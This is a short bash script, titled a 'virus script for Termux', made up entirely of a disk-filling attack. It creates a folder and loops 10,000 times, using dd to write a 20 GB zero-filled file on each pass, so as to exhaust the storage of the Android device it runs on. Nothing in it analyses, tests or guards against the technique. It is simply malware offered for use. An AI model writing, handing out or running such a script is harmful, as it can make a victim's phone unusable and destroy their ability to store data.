#!/bin/bash

# Virus script for Termux

# Function to create a large empty file
create_empty_file() {
    local file_path=$1
    local size_mb=$2
    dd if=/dev/zero of="$file_path" bs=1M count="$size_mb" > /dev/null 2>&1
}

# Main function
main() {
    local base_path="/virus_files"
    mkdir -p "$base_path"

    local file_size_gb=20
    local file_size_mb=$((file_size_gb * 1024))

    for i in {1..10000}; do
        local file_path="$base_path/empty_file_$i.bin"
        create_empty_file "$file_path" "$file_size_mb"
        echo "Created $file_path"
    done
}

# Run the main function
main
